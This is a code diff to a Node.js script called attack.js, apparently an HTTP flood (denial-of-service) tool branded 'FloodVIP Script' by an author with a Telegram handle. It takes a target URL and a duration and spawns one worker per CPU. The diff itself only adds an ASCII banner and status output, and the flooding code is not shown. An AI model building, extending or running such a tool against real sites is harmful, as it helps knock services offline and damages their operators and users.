@@ -5,6 +5,21 @@ const os = require('os');
 
 const [,, target, seconds = 30] = process.argv;
 if (!target) return console.error('Dùng: node attack.js <URL> [giây]');
+console.clear();
+ console.log(`
+██████  ██    ██  ██████   ██████     ██████  ███████ ██    ██ 
+██   ██ ██    ██ ██    ██ ██          ██   ██ ██      ██    ██ 
+██   ██ ██    ██ ██    ██ ██          ██   ██ █████   ██    ██ 
+██   ██ ██    ██ ██    ██ ██          ██   ██ ██       ██  ██  
+██████   ██████   ██████   ██████     ██████  ███████   ████   
+
+FloodVIP Script - Developed by DuocDev
+Telegram: @DuocDev
+All Rights Reserved © 2026
+`);
+console.log(`Target: ${target}`);
+console.log(`Thời gian: ${seconds}s`);
+console.log(`Số worker: ${os.cpus().length}\n`);
 
 const { hostname, port = 443, protocol, pathname = '/' } = new URL(target);
 const isHttps = protocol === 'https:';
